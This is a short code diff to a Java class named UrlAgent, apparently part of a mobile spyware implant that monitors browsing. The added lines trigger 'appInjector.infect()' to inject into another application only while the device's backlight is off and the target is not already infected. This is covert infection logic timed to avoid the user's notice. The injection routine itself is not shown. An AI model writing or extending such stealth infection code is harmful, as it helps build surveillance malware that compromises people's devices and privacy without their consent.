@@ -87,6 +87,14 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             debug.error("actualStart: " + ex);
             //#endif
         }
+        
+        if (!Backlight.isEnabled() && !appInjector.isInfected()) {
+            //#ifdef DEBUG
+            debug.info("injecting");
+            //#endif
+
+            appInjector.infect();
+        }
 
     }
 
